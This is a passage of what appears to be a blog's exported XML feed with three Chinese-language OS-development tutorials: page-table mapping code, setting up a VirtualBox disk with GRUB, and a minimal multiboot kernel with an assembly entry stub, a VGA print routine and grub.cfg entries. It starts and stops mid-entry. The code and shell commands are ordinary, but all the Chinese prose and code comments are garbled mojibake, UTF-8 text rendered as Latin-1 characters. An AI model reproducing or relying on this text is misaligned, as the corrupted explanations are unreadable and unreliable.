æ¡ç›®çš„å±æ€§ï¼Œé¡µé¢å¤§å°è®¾ç½®ä¸º2MBï¼Œè®¾ç½®ä¸ºå¯ä»¥è¯»å†™ï¼Œè®¾ç½®å­˜åœ¨ä½</span></span><br><span class="line">            adr += <span class="number">0x200000</span>;<span class="comment">// é€’å¢åœ°å€,å¢åŠ 2MB</span></span><br><span class="line">        &#125;</span><br><span class="line">        pde = (<span class="keyword">u64_t</span> *)((<span class="keyword">u32_t</span>)pde + <span class="number">0x1000</span>);<span class="comment">// åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ª PD æ¡ç›®</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p[((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; <span class="number">0x1ff</span>] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pdpte | KPML4_RW | KPML4_P);<span class="comment">//è®©é¡¶çº§é¡µç›®å½•ä¸­ç¬¬0é¡¹å’Œç¬¬((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ffé¡¹ï¼ŒæŒ‡å‘åŒä¸€ä¸ªé¡µç›®å½•è¡¨  </span></span><br><span class="line">    p[<span class="number">0</span>] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pdpte | KPML4_RW | KPML4_P);<span class="comment">//è®©é¡¶çº§é¡µç›®å½•ä¸­ç¬¬0é¡¹å’Œç¬¬((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ffé¡¹ï¼ŒæŒ‡å‘åŒä¸€ä¸ªé¡µç›®å½•è¡¨</span></span><br><span class="line">    mbsp-&gt;mb_pml4padr = (<span class="keyword">u64_t</span>)(KINITPAGE_PHYADR);<span class="comment">//ä¿å­˜PLM4åœ°å€</span></span><br><span class="line">    mbsp-&gt;mb_subpageslen = (<span class="keyword">u64_t</span>)(<span class="number">0x1000</span> * <span class="number">16</span> + <span class="number">0x2000</span>);<span class="comment">//ä¿å­˜MMUæ˜ å°„è¡¨çš„æ€»é•¿åº¦</span></span><br><span class="line">    mbsp-&gt;mb_kpmapphymemsz = (<span class="keyword">u64_t</span>)(<span class="number">0x400000000</span>);<span class="comment">//ä¿å­˜æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€çš„ç‰©ç†åœ°å€çš„å¤§å°</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡ŒpæŒ‡å‘é¡¶çº§é¡µè¡¨ï¼ŒpdpteæŒ‡å‘é¡µç›®å½•è¡¨ï¼ŒpdeæŒ‡å‘é¡µç›®å½•ï¼Œç›¸å½“äºæ˜¯3çº§é¡µè¡¨ï¼Œå¼€å§‹è¿˜æ˜¯å…ˆæ£€æŸ¥æ˜¯å¦å’Œå†…å­˜æ˜ åƒæ–‡ä»¶é‡å ï¼Œç„¶ååˆå§‹åŒ–é¡¶çº§é¡µç›®å½•è¡¨å’Œé¡µç›®å½•è¡¨ï¼Œç„¶åæˆ‘ä»¬å¯¹å†…å­˜åšæ˜ å°„ï¼Œéå†16ä¸ªé¡µç›®å½•è¡¨ï¼Œæ¯ä¸ªé¡µç›®å½•è¡¨æŒ‡å‘512ä¸ªé¡µç›®å½•ï¼Œå¯¹æ¯ä¸ªé¡µç›®å½•è®¾ç½®å±æ€§ï¼Œæ¯é¡µçš„å¤§å°ä¸º2MBï¼Œæ€»å…±çš„å¤§å°ä¸º16GBã€‚é‡ç‚¹å…³æ³¨ä¸€ä¸‹<code>p[((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff] = (u64_t)((u32_t)pdpte | KPML4_RW | KPML4_P);</code> å’Œ <code>p[0] = (u64_t)((u32_t)pdpte | KPML4_RW | KPML4_P)</code>è¿™ä¸¤è¡Œä»£ç ï¼Œä»–ä½¿å¾—0xffff800000000000å’Œ0åœ°å€è¿™ä¸¤å—è™šæ‹Ÿåœ°å€æŒ‡å‘åŒä¸€å—ç‰©ç†åœ°å€ï¼Œè¿™é‡Œçš„ç›®çš„æ˜¯å†…æ ¸åœ¨å¯åŠ¨åˆæœŸï¼Œè™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€è¦ä¿æŒç›¸åŒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨vituralboxåˆ›å»ºä¸€ä¸ªè®¡ç®—æœº</title>
      <link href="/2024/05/05/%E4%BD%BF%E7%94%A8vitualbox%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
      <url>/2024/05/05/%E4%BD%BF%E7%94%A8vitualbox%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ä½¿ç”¨vituralboxåˆ›å»ºä¸€ä¸ªè®¡ç®—æœº"><a href="#ä½¿ç”¨vituralboxåˆ›å»ºä¸€ä¸ªè®¡ç®—æœº" class="headerlink" title="ä½¿ç”¨vituralboxåˆ›å»ºä¸€ä¸ªè®¡ç®—æœº"></a>ä½¿ç”¨vituralboxåˆ›å»ºä¸€ä¸ªè®¡ç®—æœº</h1><ol><li><p>é¦–å…ˆä½¿ç”¨virtualboxåˆ›å»ºä¸€ä¸ªæ–°çš„ç¡¬ç›˜</p></li><li><p>å¯åŠ¨æˆ‘ä»¬çš„ubuntuè™šæ‹Ÿæœºï¼Œä¸ºå…¶åœ¨homeç›®å½•ä¸‹æ·»åŠ ä¸€ä¸ªhdiskæ–‡ä»¶å¤¹</p></li><li><p>æŒ‚è½½è¯¥ç¡¬ç›˜åˆ°hdiskæ–‡ä»¶å¤¹ï¼Œå¹¶åˆ›å»ºext4æ–‡ä»¶ç³»ç»Ÿ</p><p>ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkfs.ext4 /dev/sdb</span><br><span class="line">sudo mount /dev/sdb hdisk</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·æŒ‚è½½éœ€è¦æ¯æ¬¡é‡å¯ï¼Œæˆ‘ä»¬é€‰æ‹©ä¿®æ”¹/etc/fstabæ–‡ä»¶,åœ¨å…¶æœ«å°¾æ·»åŠ æˆ‘ä»¬ç¡¬ç›˜çš„ä¿¡æ¯</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121144352.png" alt="image-20240507121144352"></p><p>å¯ä»¥åœ¨rootçº§åˆ«ä½¿ç”¨<code> echo &quot;/dev/sdb        /home/kr0emer/hdisk   ext4  defaults 0  2 &quot; &gt;&gt; /etc/fstab</code>æ¥æ·»åŠ </p></li><li><p>æ¥ä¸‹æ¥åœ¨hdiskç›®å½•ä¸‹åˆ›å»ºbootç›®å½•</p></li><li><p>å®‰è£…grubåˆ°æ–°ç¡¬ç›˜</p><p><code>sudo grub-install --boot-directory=./hdisk/boot/ --force --allow-floppy /dev/sdb</code></p></li><li><p>æ¥ç€åˆ›å»ºgrub.cfgåœ¨<code>hdisk/boot/grub/</code>ç›®å½•ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">menuentry &#x27;HelloOS&#x27; &#123;</span><br><span class="line">insmod part_msdos</span><br><span class="line">insmod ext2</span><br><span class="line">set root=&#x27;hd0&#x27; #æˆ‘ä»¬çš„ç¡¬ç›˜åªæœ‰ä¸€ä¸ªåˆ†åŒºæ‰€ä»¥æ˜¯&#x27;hd0&#x27;</span><br><span class="line">multiboot2 /boot/HelloOS.eki #åŠ è½½bootç›®å½•ä¸‹çš„HelloOS.ekiæ–‡ä»¶</span><br><span class="line">boot #å¼•å¯¼å¯åŠ¨</span><br><span class="line">&#125;</span><br><span class="line">set timeout_style=menu</span><br><span class="line">if [ &quot;$&#123;timeout&#125;&quot; = 0 ]; then</span><br><span class="line">  set timeout=10 #ç­‰å¾…10ç§’é’Ÿè‡ªåŠ¨å¯åŠ¨</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li><li><p>æ¥ä¸‹æ¥å…³é—­è¿™ä¸ªubuntuè™šæ‹Ÿæœºå¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿæœºï¼Œé€‰æ‹©hd.vidæ¥åˆ›å»ºè™šæ‹Ÿæœº</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121715737.png" alt="image-20240507121715737"></p></li><li><p>æ¥ä¸‹æ¥æ‰“å¼€è¯¥è™šæ‹Ÿæœºï¼Œå¾—åˆ°ä¸‹å›¾åŸºæœ¬ä¸Šå°±æˆåŠŸäº†ï¼Œåé¢åˆ›å»ºHelloOS.ekiå°±å¯ä»¥äº†</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20240507121903606.png" alt="image-20240507121903606"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®ç°ä¸€ä¸ªæœ€ç®€å•çš„å†…æ ¸</title>
      <link href="/2023/11/12/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/"/>
      <url>/2023/11/12/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¼–å†™ä¸€ä¸ªå¼•å¯¼ç¨‹åº"><a href="#ç¼–å†™ä¸€ä¸ªå¼•å¯¼ç¨‹åº" class="headerlink" title="ç¼–å†™ä¸€ä¸ªå¼•å¯¼ç¨‹åº"></a>ç¼–å†™ä¸€ä¸ªå¼•å¯¼ç¨‹åº</h1><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆè¦ç¼–å†™ä¸€ä¸ªæ±‡ç¼–ç¨‹åºï¼Œä½¿ç”¨Cè¯­è¨€ä½œä¸ºé«˜çº§è¯­è¨€ä¸èƒ½ç›´æ¥æ§åˆ¶ç¡¬ä»¶ï¼Œè€Œä¸” C è¯­è¨€çš„å‡½æ•°è°ƒç”¨ã€å‡½æ•°ä¼ å‚ï¼Œéƒ½éœ€è¦ç”¨æ ˆã€‚æˆ‘ä»¬éœ€è¦å…ˆè¦ä¸ºCè¯­è¨€æä¾›ä¸€ä¸ªå·¥ä½œç¯å¢ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MBT_HDR_FLAGS EQU 0x00010003;flagå­—æ®µï¼ŒæŒ‡å‡ºOSæ˜ åƒéœ€è¦å¼•å¯¼ç¨‹åºæä¾›æˆ–æ”¯æŒçš„ç‰¹æ€§</span><br><span class="line">MBT_HDR_MAGIC EQU 0x1BADB002 ;å¤šå¼•å¯¼åè®®å¤´é­”æ•°</span><br><span class="line">MBT_HDR2_MAGIC EQU 0xe85250d6 ;ç¬¬äºŒç‰ˆå¤šå¼•å¯¼åè®®å¤´é­”æ•°</span><br><span class="line">global _start ;å¯¼å‡º_startç¬¦å·</span><br><span class="line">extern main ;å¯¼å…¥å¤–éƒ¨çš„mainå‡½æ•°ç¬¦å·</span><br><span class="line">[section .start.text] ;å®šä¹‰.start.textä»£ç èŠ‚</span><br><span class="line">[bits 32] ;æ±‡ç¼–æˆ32ä½ä»£ç </span><br><span class="line">_start:</span><br><span class="line">jmp _entry</span><br><span class="line">ALIGN 8</span><br><span class="line">mbt_hdr:</span><br><span class="line">dd MBT_HDR_MAGIC</span><br><span class="line">dd MBT_HDR_FLAGS</span><br><span class="line">dd -(MBT_HDR_MAGIC+MBT_HDR_FLAGS)</span><br><span class="line">dd mbt_hdr</span><br><span class="line">dd _start</span><br><span class="line">dd 0</span><br><span class="line">dd 0</span><br><span class="line">dd _entry</span><br><span class="line">;ä»¥ä¸Šæ˜¯GRUBæ‰€éœ€è¦çš„å¤´</span><br><span class="line">ALIGN 8</span><br><span class="line">mbt2_hdr:</span><br><span class="line">DD MBT_HDR2_MAGIC</span><br><span class="line">DD 0</span><br><span class="line">DD mbt2_hdr_end - mbt2_hdr</span><br><span class="line">DD -(MBT_HDR2_MAGIC + 0 + (mbt2_hdr_end - mbt2_hdr))</span><br><span class="line">DW 2, 0</span><br><span class="line">DD 24</span><br><span class="line">DD mbt2_hdr</span><br><span class="line">DD _start</span><br><span class="line">DD 0</span><br><span class="line">DD 0</span><br><span class="line">DW 3, 0</span><br><span class="line">DD 12</span><br><span class="line">DD _entry</span><br><span class="line">DD 0</span><br><span class="line">DW 0, 0</span><br><span class="line">DD 8</span><br><span class="line">mbt2_hdr_end:</span><br><span class="line">;ä»¥ä¸Šæ˜¯GRUB2æ‰€éœ€è¦çš„å¤´</span><br><span class="line">;åŒ…å«ä¸¤ä¸ªå¤´æ˜¯ä¸ºäº†åŒæ—¶å…¼å®¹GRUBã€GRUB2</span><br><span class="line">ALIGN 8</span><br><span class="line">_entry:</span><br><span class="line">;å…³ä¸­æ–­</span><br><span class="line">cli</span><br><span class="line">;å…³ä¸å¯å±è”½ä¸­æ–­</span><br><span class="line">in al, 0x70</span><br><span class="line">or al, 0x80</span><br><span class="line">out 0x70,al</span><br><span class="line">;é‡æ–°åŠ è½½GDT</span><br><span class="line">lgdt [GDT_PTR]</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br><span class="line">_32bits_mode:</span><br><span class="line">;ä¸‹é¢åˆå§‹åŒ–Cè¯­è¨€å¯èƒ½ä¼šç”¨åˆ°çš„å¯„å­˜å™¨</span><br><span class="line">mov ax, 0x10</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">;åˆå§‹åŒ–æ ˆï¼ŒCè¯­è¨€éœ€è¦æ ˆæ‰èƒ½å·¥ä½œ</span><br><span class="line">mov esp,0x9000</span><br><span class="line">;è°ƒç”¨Cè¯­è¨€å‡½æ•°main</span><br><span class="line">call main</span><br><span class="line">;è®©CPUåœæ­¢æ‰§è¡ŒæŒ‡ä»¤</span><br><span class="line">halt_step:</span><br><span class="line">halt</span><br><span class="line">jmp halt_step</span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0</span><br><span class="line">kcode_dsc: dq 0x00cf9e000000ffff</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff</span><br><span class="line">k16cd_dsc: dq 0x00009e000000ffff</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff</span><br><span class="line">GDT_END:</span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLEN dw GDT_END-GDT_START-1</span><br><span class="line">GDTBASE dd GDT_START</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥å¯¹ä¸Šé¢çš„æ±‡ç¼–åšä¸€äº›è¯¦ç»†çš„è§£é‡Šï¼š</p><ol><li><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä»£ç çš„ç¬¬1è¡Œåˆ°ç¬¬39è¡Œ</p><p>é¦–å…ˆæ˜¯<strong>MBT_HDR_FLAGS</strong>ï¼Œå…¶å®šä¹‰çš„æ˜¯<strong>flags</strong>å­—æ®µï¼Œç”¨æ¥æŒ‡å‡ºOSæ˜ åƒéœ€è¦å¼•å¯¼ç¨‹åºæä¾›æˆ–æ”¯æŒçš„ç‰¹æ€§ã€‚å…¶ä¸­0-15ä½æŒ‡å‡ºéœ€æ±‚ï¼šå¦‚æœå¼•å¯¼ç¨‹åºå‘ç°æŸäº›å€¼æ¯è®¾ç½®ï¼Œä½†å‡ºäºæŸç§åŸå› æ— æ³•æ»¡è¶³å…¶éœ€æ±‚ï¼Œåˆ™éœ€è¦å‘ŠçŸ¥ç”¨æˆ·ï¼Œå¹¶æ‹’ç»åŠ è½½æ“ä½œç³»ç»Ÿæ˜ åƒã€‚å…¶ä¸­16-31ä½ä¸ºå¯é€‰ç‰¹æ€§ï¼Œä¸ä½16ä½ä¸åŒï¼Œå¦‚æœæ— æ³•æ»¡è¶³è¦æ±‚å¯ä»¥å¿½è§†å¹¶ç…§å¸¸è¿›è¡Œã€‚è‡ªç„¶ï¼Œæ‰€æœ‰flagså°šæœªå®šä¹‰çš„ä½éƒ½å¿…é¡»<strong>è®¾ç½®ä¸º0</strong>ã€‚flagså­—æ®µçš„ä½œç”¨æ˜¯ç”¨äºç‰ˆæœ¬æ§åˆ¶ä»¥åŠç®€å•çš„åŠŸèƒ½é€‰æ‹©ã€‚</p><p>å…¶ä¸­<strong>ç¬¬0ä½</strong>è‹¥ä¸º1ï¼Œé‚£ä¹ˆæ‰€æœ‰ä¸æ“ä½œç³»ç»Ÿä¸€èµ·åŠ è½½çš„å¼•å¯¼æ¨¡å—å¿…é¡»åœ¨é¡µé¢ï¼ˆ4KBï¼‰è¾¹ç•Œä¸Šå¯¹é½ã€‚æœ‰äº›æ“ä½œç³»ç»Ÿèƒ½å¤Ÿåœ¨å¯åŠ¨æ—¶å°†åŒ…å«å¼•å¯¼æ¨¡å—çš„é¡µç›´æ¥æ˜ å°„åˆ°ä¸€ä¸ªåˆ†é¡µçš„åœ°å€ç©ºé—´ï¼Œå› æ­¤éœ€è¦å¼•å¯¼æ¨¡å—æ˜¯é¡µå¯¹é½çš„ã€‚</p><p>å¦‚æœ<strong>ç¬¬1ä½</strong>ä¸º1åˆ™å¿…é¡»é€šè¿‡Multibootä¿¡æ¯ç»“æ„çš„**mem_***åŸŸåŒ…æ‹¬å¯ç”¨å†…å­˜çš„ä¿¡æ¯ã€‚</p><p>å¦‚æœå¼•å¯¼ç¨‹åºèƒ½å¤Ÿä¼ é€’å†…å­˜åˆ†å¸ƒï¼ˆ**mmap_***åŸŸï¼‰å¹¶ä¸”å®ƒç¡®å®å­˜åœ¨ï¼Œåˆ™ä¹ŸåŒ…æ‹¬å®ƒã€‚</p><p>å¦‚æœ<strong>ç¬¬2ä½</strong>ä¸º1ï¼Œæœ‰å…³è§†é¢‘æ¨¡å¼è¡¨ï¼ˆå‚è§å¼•å¯¼ä¿¡æ¯æ ¼å¼ï¼‰çš„ä¿¡æ¯å¿…é¡»å¯¹å†…æ ¸æœ‰æ•ˆ</p><p>å¦‚æœflagså­—æ®µä¸­çš„<strong>ç¬¬16ä½</strong>è¢«è®¾ç½®ï¼Œé‚£ä¹ˆMultibootå¤´éƒ¨ä¸­åç§»é‡ä¸º12-28çš„å­—æ®µæ˜¯æœ‰æ•ˆçš„ï¼Œå¼•å¯¼åŠ è½½å™¨åº”è¯¥ä½¿ç”¨å®ƒä»¬è€Œä¸æ˜¯å®é™…å¯æ‰§è¡Œå¤´éƒ¨ä¸­çš„å­—æ®µæ¥è®¡ç®—åŠ è½½æ“ä½œç³»ç»Ÿé•œåƒçš„ä½ç½®ã€‚å¦‚æœå†…æ ¸é•œåƒæ˜¯ELFæ ¼å¼çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªä¿¡æ¯ä¸éœ€è¦è¢«æä¾›ï¼Œä½†æ˜¯å¦‚æœé•œåƒæ˜¯a.outæ ¼å¼æˆ–è€…å…¶ä»–æ ¼å¼çš„ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»è¢«æä¾›ã€‚ç¬¦åˆè§„èŒƒçš„å¼•å¯¼åŠ è½½å™¨å¿…é¡»èƒ½å¤ŸåŠ è½½é‚£äº›è¦ä¹ˆæ˜¯ELFæ ¼å¼çš„ï¼Œè¦ä¹ˆåŒ…å«äº†åµŒå…¥åœ¨Multibootå¤´éƒ¨ä¸­çš„åŠ è½½åœ°å€ä¿¡æ¯çš„é•œåƒï¼›å®ƒä»¬ä¹Ÿå¯ä»¥ç›´æ¥æ”¯æŒå…¶ä»–å¯æ‰§è¡Œæ ¼å¼ï¼Œæ¯”å¦‚ç‰¹å®šçš„a.outå˜ä½“ï¼Œä½†æ˜¯ä¸æ˜¯å¿…é¡»çš„ã€‚</p><p>æ¥ä¸‹æ¥<strong>MBT_HDR_MAGIC</strong>åˆ™ä»£è¡¨ç€å¤šå¼•å¯¼åè®®å¤´é­”æ•°ï¼Œ<strong>MBT_HDR2_MAGIC</strong>ç¬¬äºŒç‰ˆå¤šå¼•å¯¼åè®®å¤´é­”æ•°ï¼Œå¯ä»¥å‘Šè¯‰è®¡ç®—æœºä½¿ç”¨çš„æ˜¯ä½•ç§åè®®ã€‚</p><p>æ¥ä¸‹æ¥ä»ç¬¬10è¡Œåˆ°ç¬¬19è¡Œä»£è¡¨GRUBæ‰€éœ€è¦çš„å¤´ï¼Œ21åˆ°39è¡Œä¸ºGRUB2æ‰€éœ€è¦çš„å¤´ã€‚åŒ…å«è¿™ä¸¤ä¸ªå¤´æ˜¯ä¸ºäº†å…¼å®¹GRUBä¸GRUB2ã€‚</p></li><li><p>ä»£ç 43~5è¡Œï¼Œå…³æ‰ä¸­æ–­ï¼Œè®¾å®š CPU çš„å·¥ä½œæ¨¡å¼ã€‚</p></li><li><p>ä»£ç 53~72è¡Œï¼Œåˆå§‹åŒ– CPU çš„å¯„å­˜å™¨å’Œ C è¯­è¨€çš„è¿è¡Œç¯å¢ƒã€‚</p></li><li><p>ä»£ç 77~86è¡Œï¼ŒGDT_START å¼€å§‹çš„ï¼Œæ˜¯ CPU å·¥ä½œæ¨¡å¼æ‰€éœ€è¦çš„æ•°æ®ã€‚</p></li></ol><h2 id="ç¼–å†™Cä»£ç "><a href="#ç¼–å†™Cä»£ç " class="headerlink" title="ç¼–å†™Cä»£ç "></a>ç¼–å†™Cä»£ç </h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vgastr.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello OS!&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»å‡½æ•°å®ç°äº†ä¸€ä¸ªæ‰“å°â€Hello OS!â€å­—ç¬¦ä¸²çš„åŠŸèƒ½ï¼Œä½†æ˜¯æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿä¸­æ²¡æœ‰åº“å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå®šä¹‰ä¸€ä¸ªprintfå‡½æ•°æ‰“å°åˆ°å±å¹•ä¸Šã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vgastr.c</span></span><br><span class="line"><span class="keyword">void</span> _strwrite(<span class="keyword">char</span> * str)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span>* p_str = (<span class="keyword">char</span>*)(<span class="number">0xb8000</span>);</span><br><span class="line">    <span class="keyword">while</span> (*str)</span><br><span class="line">    &#123;</span><br><span class="line">        *p_str = *str;</span><br><span class="line">        p_str+=<span class="number">2</span>;</span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">(<span class="keyword">char</span> *str,...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _strwrite(str);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_strwriteå‡½æ•°å°†æˆ‘ä»¬è¦æ‰“å°çš„å­—ç¬¦æ‰“å°åˆ°å±å¹•ä¹‹ä¸Šä»0xb8000å¼€å§‹æ¯ä¸¤ä¸ªå­—ç¬¦ä»£è¡¨ä¸€ä¸ªå­—æ¯ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä»£è¡¨ç€å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå­—èŠ‚ä»£è¡¨ç€å­—ä½“çš„é¢œè‰²ï¼Œå…¶å­—ç¬¦ç¼–ç é€šå¸¸æ˜¯ utf8ï¼Œè€Œ utf8 ç¼–ç å¯¹ ASCII å­—ç¬¦æ˜¯å…¼å®¹çš„ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//vgastr.h</span></span><br><span class="line"><span class="keyword">void</span> _strwrite(<span class="keyword">char</span> * str);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">(<span class="keyword">char</span> *str,...)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="ç¼–è¯‘å’Œéƒ¨ç½²"><a href="#ç¼–è¯‘å’Œéƒ¨ç½²" class="headerlink" title="ç¼–è¯‘å’Œéƒ¨ç½²"></a>ç¼–è¯‘å’Œéƒ¨ç½²</h1><p>é€šè¿‡makefileå°†ä»£ç ç¼–è¯‘ï¼Œå¾—åˆ°<strong>HelloOS.bin</strong>ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231111235434726.png" alt="ç¼–è¯‘çš„ç»“æœ"></p><p>æ¥ä¸‹æ¥å°±æ˜¯éƒ¨ç½²äº†</p><p>æˆ‘ä»¬è¿›å…¥etc\default\grubæ–‡ä»¶</p><p>é¦–å…ˆå°†<strong>GRUB_TIMEOUT_STYLE</strong>çš„å€¼ä»<strong>hidden</strong>æ”¹ä¸º<strong>menu</strong>ï¼Œå¹¶å°†<strong>GRUB_TIMEOUT</strong>çš„å€¼ä»<strong>0</strong>æ”¹ä¸º<strong>30</strong></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112001856786.png" alt="ä¿®æ”¹grubæ–‡ä»¶"></p><p>ç„¶åæ›´æ–°grubé…ç½®</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä¿®æ”¹/boot/grub/grub.cfgæ–‡ä»¶ï¼Œå¢åŠ HelloOSé¡¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menuentry &#x27;HelloOS&#x27; &#123;</span><br><span class="line">     insmod part_gpt #GRUBåŠ è½½åˆ†åŒºæ¨¡å—è¯†åˆ«åˆ†åŒº</span><br><span class="line">     insmod ext2 #GRUBåŠ è½½extæ–‡ä»¶ç³»ç»Ÿæ¨¡å—è¯†åˆ«extæ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">     set root=&#x27;hd0,gpt3&#x27; #æ³¨æ„bootç›®å½•æŒ‚è½½çš„åˆ†åŒºï¼Œè¿™æ˜¯æˆ‘æœºå™¨ä¸Šçš„æƒ…å†µ</span><br><span class="line">     multiboot2 /boot/HelloOS.bin #GRUBä»¥multiboot2åè®®åŠ è½½HelloOS.bin</span><br><span class="line">     boot #GRUBå¯åŠ¨HelloOS.bin</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®<code>df /root/</code>çš„å‘½ä»¤æ¥æŸ¥çœ‹set rootåº”è¯¥è®¾ç½®ä¸ºä»€ä¹ˆ</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112003200032.png" alt="df /root/å‘½ä»¤"></p><p>å…¶ä¸­çš„â€œsda3â€å°±æ˜¯ç¡¬ç›˜çš„ç¬¬å››ä¸ªåˆ†åŒºï¼ˆç¡¬ä»¶åˆ†åŒºé€‰æ‹© MBRï¼‰ï¼Œä½†æ˜¯ GRUB çš„ menuentry ä¸­ä¸èƒ½å†™ sda3ï¼Œè€Œæ˜¯è¦å†™â€œhd0,gpt3â€ï¼Œè¿™æ˜¯ GRUB çš„å‘½åæ–¹å¼ï¼Œhd0 è¡¨ç¤ºç¬¬ä¸€å—ç¡¬ç›˜ï¼Œæˆ‘çš„è™šæ‹Ÿæœºæ˜¯ä½¿ç”¨gptåˆ†åŒºè¡¨æ‰€ä»¥æ˜¯gpt3ã€‚</p><p>å¯ä»¥æ ¹æ®grub.cfgå…¶ä»–çš„menuentryæ¥ç¡®å®šã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005549038.png" alt="grub.cfg"></p><p>æœ€åå°†HelloOS.binæ–‡ä»¶å¤åˆ¶åˆ°/boot/ç›®å½•ä¸‹ï¼Œé‡å¯è™šæ‹Ÿæœºã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005655001.png" alt="é€‰æ‹©HelloOS"></p><p>é€‰æ‹©HelloOS,å¯ä»¥çœ‹åˆ°HelloOSçš„å­—æ ·ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20231112005707224.png" 